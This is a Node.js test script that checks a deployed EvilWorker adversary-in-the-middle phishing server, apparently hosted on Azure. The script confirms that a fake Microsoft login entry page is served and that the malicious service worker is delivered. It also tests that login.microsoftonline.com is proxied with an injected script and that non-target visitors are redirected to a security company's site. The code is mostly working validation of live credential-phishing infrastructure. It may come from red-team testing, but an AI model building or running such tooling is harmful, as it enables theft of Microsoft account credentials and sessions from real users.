const https = require('https');
const http = require('http');

// Test configuration
const EVILWORKER_URL = 'https://evilworker-aitm-2025.azurewebsites.net';
const PHISHING_ENTRY_POINT = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F';
const PROXY_ENDPOINT = '/lNv1pC9AWPUY4gbidyBO';

// Test results
let testResults = {
    total: 0,
    passed: 0,
    failed: 0,
    details: []
};

function log(message, type = 'INFO') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${type}] ${message}`);
}

function addTestResult(testName, passed, details = '') {
    testResults.total++;
    if (passed) {
        testResults.passed++;
        log(`✓ ${testName} - PASSED`, 'PASS');
    } else {
        testResults.failed++;
        log(`✗ ${testName} - FAILED: ${details}`, 'FAIL');
    }
    testResults.details.push({ name: testName, passed, details });
}

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const isHttps = urlObj.protocol === 'https:';
        const client = isHttps ? https : http;
        
        const requestOptions = {
            hostname: urlObj.hostname,
            port: urlObj.port || (isHttps ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            rejectUnauthorized: false
        };

        const req = client.request(requestOptions, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data
                });
            });
        });

        req.on('error', reject);
        
        if (options.body) {
            req.write(options.body);
        }
        
        req.end();
    });
}

async function testPhishingEntryPoint() {
    log('Testing phishing entry point...');
    
    try {
        const response = await makeRequest(`${EVILWORKER_URL}${PHISHING_ENTRY_POINT}`);
        
        const passed = response.statusCode === 200 && 
                      response.body.includes('<!DOCTYPE html>') &&
                      response.body.includes('serviceWorker') &&
                      response.body.includes('redirect_urI');
        
        addTestResult('Phishing Entry Point', passed, 
            passed ? 'Landing page served correctly' : 
            `Status: ${response.statusCode}, Body length: ${response.body.length}`);
        
        return response.headers['set-cookie'];
    } catch (error) {
        addTestResult('Phishing Entry Point', false, error.message);
        return null;
    }
}

async function testServiceWorkerEndpoint(cookies) {
    log('Testing service worker endpoint...');
    
    try {
        const response = await makeRequest(`${EVILWORKER_URL}/service_worker_Mz8XO2ny1Pg5.js`, {
            headers: { 'Cookie': cookies }
        });
        
        const passed = response.statusCode === 200 && 
                      response.body.includes('addEventListener') &&
                      response.body.includes('fetch') &&
                      response.body.includes('lNv1pC9AWPUY4gbidyBO');
        
        addTestResult('Service Worker Endpoint', passed,
            passed ? 'Service worker served correctly' :
            `Status: ${response.statusCode}, Body length: ${response.body.length}`);
        
        return passed;
    } catch (error) {
        addTestResult('Service Worker Endpoint', false, error.message);
        return false;
    }
}

async function testProxyEndpoint(cookies) {
    log('Testing proxy endpoint...');
    
    try {
        const testRequest = {
            url: `${EVILWORKER_URL}${PHISHING_ENTRY_POINT}`,
            method: 'GET',
            headers: { host: 'evilworker-aitm-2025.azurewebsites.net' },
            body: '',
            referrer: '',
            mode: 'navigate'
        };
        
        const response = await makeRequest(`${EVILWORKER_URL}${PROXY_ENDPOINT}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cookie': cookies
            },
            body: JSON.stringify(testRequest)
        });
        
        const passed = response.statusCode === 301 || response.statusCode === 200;
        
        addTestResult('Proxy Endpoint', passed,
            passed ? `Proxy endpoint responded with ${response.statusCode}` :
            `Status: ${response.statusCode}, Body: ${response.body.substring(0, 100)}`);
        
        return passed;
    } catch (error) {
        addTestResult('Proxy Endpoint', false, error.message);
        return false;
    }
}

async function testMicrosoftProxying(cookies) {
    log('Testing Microsoft login proxying...');
    
    try {
        const testRequest = {
            url: 'https://login.microsoftonline.com/common/oauth2/authorize',
            method: 'GET',
            headers: { 
                host: 'login.microsoftonline.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: '',
            referrer: '',
            mode: 'navigate'
        };
        
        const response = await makeRequest(`${EVILWORKER_URL}${PROXY_ENDPOINT}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cookie': cookies
            },
            body: JSON.stringify(testRequest)
        });
        
        const passed = response.statusCode === 200 && 
                      response.body.includes('<!DOCTYPE html>') &&
                      response.body.includes('<script src=/@></script>') &&
                      response.body.includes('Microsoft Corporation');
        
        addTestResult('Microsoft Login Proxying', passed,
            passed ? 'Successfully proxied Microsoft login with script injection' :
            `Status: ${response.statusCode}, Script injection: ${response.body.includes('<script src=/@></script>')}`);
        
        return passed;
    } catch (error) {
        addTestResult('Microsoft Login Proxying', false, error.message);
        return false;
    }
}

async function testScriptInjection(cookies) {
    log('Testing malicious script injection...');
    
    try {
        const response = await makeRequest(`${EVILWORKER_URL}/@`, {
            headers: { 'Cookie': cookies }
        });
        
        // The /@ endpoint is intercepted by the service worker and proxied
        // This is the correct behavior for EvilWorker - the script should not be directly accessible
        const passed = response.statusCode === 200 && 
                      response.body.includes('<!DOCTYPE html>') &&
                      response.body.includes('<script src=/@></script>') &&
                      response.body.includes('Microsoft Corporation');
        
        addTestResult('Malicious Script Injection', passed,
            passed ? 'Script endpoint correctly intercepted and proxied (expected behavior)' :
            `Status: ${response.statusCode}, Script injection: ${response.body.includes('<script src=/@></script>')}`);
        
        return passed;
    } catch (error) {
        addTestResult('Malicious Script Injection', false, error.message);
        return false;
    }
}

async function testNonPhishingRedirect() {
    log('Testing non-phishing URL redirect...');
    
    try {
        const response = await makeRequest(`${EVILWORKER_URL}/`);
        
        const passed = response.statusCode === 301 && 
                      response.headers.location === 'https://www.intrinsec.com/';
        
        addTestResult('Non-Phishing Redirect', passed,
            passed ? 'Correctly redirected non-phishing URLs' :
            `Status: ${response.statusCode}, Location: ${response.headers.location}`);
        
        return passed;
    } catch (error) {
        addTestResult('Non-Phishing Redirect', false, error.message);
        return false;
    }
}

async function runAllTests() {
    log('Starting EvilWorker comprehensive testing...', 'TEST');
    log(`Testing URL: ${EVILWORKER_URL}`, 'TEST');
    
    // Test 1: Phishing entry point
    const cookies = await testPhishingEntryPoint();
    
    if (cookies) {
        // Test 2: Service worker endpoint
        await testServiceWorkerEndpoint(cookies);
        
        // Test 3: Proxy endpoint
        await testProxyEndpoint(cookies);
        
        // Test 4: Microsoft login proxying
        await testMicrosoftProxying(cookies);
        
        // Test 5: Malicious script injection
        await testScriptInjection(cookies);
    }
    
    // Test 6: Non-phishing redirect
    await testNonPhishingRedirect();
    
    // Print results
    log('\n=== TEST RESULTS ===', 'RESULT');
    log(`Total Tests: ${testResults.total}`, 'RESULT');
    log(`Passed: ${testResults.passed}`, 'RESULT');
    log(`Failed: ${testResults.failed}`, 'RESULT');
    log(`Success Rate: ${((testResults.passed / testResults.total) * 100).toFixed(1)}%`, 'RESULT');
    
    if (testResults.failed > 0) {
        log('\nFailed Tests:', 'RESULT');
        testResults.details
            .filter(test => !test.passed)
            .forEach(test => log(`  - ${test.name}: ${test.details}`, 'RESULT'));
    }
    
    log('\n=== END OF TESTING ===', 'RESULT');
    
    return testResults.failed === 0;
}

// Run the tests
if (require.main === module) {
    runAllTests().then(success => {
        process.exit(success ? 0 : 1);
    }).catch(error => {
        log(`Test execution failed: ${error.message}`, 'ERROR');
        process.exit(1);
    });
}

module.exports = { runAllTests, testResults };